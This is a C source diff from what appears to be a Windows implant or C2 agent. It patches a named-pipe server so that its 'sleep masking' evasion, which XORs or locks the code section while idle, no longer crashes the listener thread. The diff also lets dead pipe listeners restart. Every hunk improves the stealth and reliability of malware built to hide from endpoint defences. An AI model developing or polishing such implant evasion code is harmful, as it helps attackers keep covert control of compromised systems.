@@ -297,11 +297,10 @@ static void ps_global_init(void) {
 static DWORD WINAPI accept_thread(LPVOID arg) {
     PipeServer *srv = (PipeServer*)arg;
 
-    /* Inhibit sleep masking for the entire accept loop — ConnectNamedPipe blocks
-     * in kernel, but on client connect it returns to user-space code in .text;
-     * if sleep_masked() has set .text PAGE_NOACCESS at that instant, we fault.
-     * Must be called BEFORE make_pipe_sa() so no .text code runs unprotected. */
-    evasion_conn_enter();
+    /* evasion_conn_enter() was called by pipe_server_start() BEFORE CreateThread
+     * to close the race where sleep_masked() could XOR/NOACCESS .text between
+     * CreateThread() returning and this thread executing its first instruction.
+     * The paired evasion_conn_leave() at thread exit remains here. */
 
     SECURITY_ATTRIBUTES *sa = make_pipe_sa();
 
@@ -379,13 +378,27 @@ char* pipe_server_start(const char *pipe_name) {
 
     EnterCriticalSection(&g_srv_mu);
 
-    /* idempotent — already running? */
+    /* idempotent — already running?  Check thread liveness too: an accept_thread
+     * that died (e.g. from a startup race) leaves a stale entry with a matching
+     * name but a thread that has already exited.  In that case, fall through and
+     * re-create it rather than returning a false "already running" message. */
     for (int i = 0; i < g_srv_count; i++) {
         if (strcmp(g_srv[i].name, name) == 0) {
-            LeaveCriticalSection(&g_srv_mu);
-            char *r = (char*)malloc(512);
-            if (r) snprintf(r, 512, "[*] pipe server already running on %s", name);
-            return r;
+            BOOL alive = (g_srv[i].thread &&
+                          WaitForSingleObject(g_srv[i].thread, 0) == WAIT_TIMEOUT);
+            if (alive) {
+                LeaveCriticalSection(&g_srv_mu);
+                char *r = (char*)malloc(512);
+                if (r) snprintf(r, 512, "[*] pipe server already running on %s", name);
+                return r;
+            }
+            /* Thread is dead — clean up the stale entry and fall through to restart. */
+            if (g_srv[i].thread) { CloseHandle(g_srv[i].thread); g_srv[i].thread = NULL; }
+            DeleteCriticalSection(&g_srv[i].cs);
+            g_srv_count--;
+            if (i < g_srv_count) g_srv[i] = g_srv[g_srv_count];
+            memset(&g_srv[g_srv_count], 0, sizeof(g_srv[g_srv_count]));
+            break;
         }
     }
 
@@ -401,8 +414,14 @@ char* pipe_server_start(const char *pipe_name) {
     srv->accept_h = NULL;
     InitializeCriticalSection(&srv->cs);
 
+    /* Increment BEFORE CreateThread: closes the race where sleep_masked() fires
+     * between CreateThread() returning and accept_thread executing its first
+     * instruction in .text.  If accept_thread sees .text PAGE_NOACCESS on entry
+     * it faults and the thread dies silently, leaving the pipe never created. */
+    evasion_conn_enter();
     srv->thread = CreateThread(NULL, 0, accept_thread, srv, 0, NULL);
     if (!srv->thread) {
+        evasion_conn_leave();
         DeleteCriticalSection(&srv->cs);
         LeaveCriticalSection(&g_srv_mu);
         return strdup("[-] CreateThread failed for pipe server");
